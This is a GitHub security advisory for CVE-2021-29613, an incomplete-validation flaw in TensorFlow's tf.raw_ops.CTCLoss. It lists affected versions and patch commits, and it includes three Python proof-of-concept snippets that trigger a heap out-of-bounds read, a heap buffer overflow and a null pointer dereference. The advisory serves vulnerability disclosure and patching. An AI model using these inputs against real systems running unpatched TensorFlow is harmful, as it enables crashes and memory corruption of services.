# [M] Incomplete validation in `tf.raw_ops.CTCLoss`

## Summary
Severity: Medium
Advisory: GHSA-vvg4-vgrv-xfr7
CVE: CVE-2021-29613
CWE: CWE-125, CWE-665
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2021-05-21
Source: https://github.com/advisories/GHSA-vvg4-vgrv-xfr7
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.1.4
- PyPI: `tensorflow` — affected >=2.2.0 <2.2.3
- PyPI: `tensorflow` — affected >=2.3.0 <2.3.3
- PyPI: `tensorflow` — affected >=2.4.0 <2.4.2
- PyPI: `tensorflow-cpu` — affected >=0 <2.1.4
- PyPI: `tensorflow-cpu` — affected >=2.2.0 <2.2.3
- PyPI: `tensorflow-cpu` — affected >=2.3.0 <2.3.3
- PyPI: `tensorflow-cpu` — affected >=2.4.0 <2.4.2
- PyPI: `tensorflow-gpu` — affected >=0 <2.1.4
- PyPI: `tensorflow-gpu` — affected >=2.2.0 <2.2.3
- PyPI: `tensorflow-gpu` — affected >=2.3.0 <2.3.3
- PyPI: `tensorflow-gpu` — affected >=2.4.0 <2.4.2

## Details
### Impact 
Incomplete validation in `tf.raw_ops.CTCLoss` allows an attacker to trigger an OOB read from heap:

```python
import tensorflow as tf

inputs = tf.constant([], shape=[10, 16, 0], dtype=tf.float32)
labels_indices = tf.constant([], shape=[8, 0], dtype=tf.int64)
labels_values = tf.constant([-100] * 8, shape=[8], dtype=tf.int32)
sequence_length = tf.constant([-100] * 16, shape=[16], dtype=tf.int32)
  
tf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,
                   labels_values=labels_values, sequence_length=sequence_length,
                   preprocess_collapse_repeated=True, ctc_merge_repeated=False,
                   ignore_longer_outputs_than_inputs=True)
```   
      
An attacker can also trigger a heap buffer overflow:

```python
import tensorflow as tf

inputs = tf.constant([], shape=[7, 2, 0], dtype=tf.float32)
labels_indices = tf.constant([-100, -100], shape=[2, 1], dtype=tf.int64)
labels_values = tf.constant([-100, -100], shape=[2], dtype=tf.int32)
sequence_length = tf.constant([-100, -100], shape=[2], dtype=tf.int32)

tf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,
                   labels_values=labels_values, sequence_length=sequence_length,
                   preprocess_collapse_repeated=False, ctc_merge_repeated=False,
                   ignore_longer_outputs_than_inputs=False)
```

Finally, an attacker can trigger a null pointer dereference:

```python 
import tensorflow as tf

inputs = tf.constant([], shape=[0, 2, 11], dtype=tf.float32)
labels_indices = tf.constant([], shape=[0, 2], dtype=tf.int64)
labels_values = tf.constant([], shape=[0], dtype=tf.int32)
sequence_length = tf.constant([-100, -100], shape=[2], dtype=tf.int32)

tf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,
                   labels_values=labels_values, sequence_length=sequence_length,
                   preprocess_collapse_repeated=False, ctc_merge_repeated=False,
                   ignore_longer_outputs_than_inputs=False)
```

### Patches
We have patched the issue in GitHub commit[14607c0707040d775e06b6817325640cb4b5864c](https://github.com/tensorflow/tensorflow/commit/14607c0707040d775e06b6817325640cb4b5864c) followed by GitHub commit [4504a081af71514bb1828048363e6540f797005b](https://github.com/tensorflow/tensorflow/commit/4504a081af71514bb1828048363e6540f797005b).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick these commits on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vvg4-vgrv-xfr7
- https://nvd.nist.gov/vuln/detail/CVE-2021-29613
- https://github.com/tensorflow/tensorflow/commit/14607c0707040d775e06b6817325640cb4b5864c
- https://github.com/tensorflow/tensorflow/commit/4504a081af71514bb1828048363e6540f797005b
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2021-541.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2021-739.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow/PYSEC-2021-250.yaml
- https://github.com/tensorflow/tensorflow
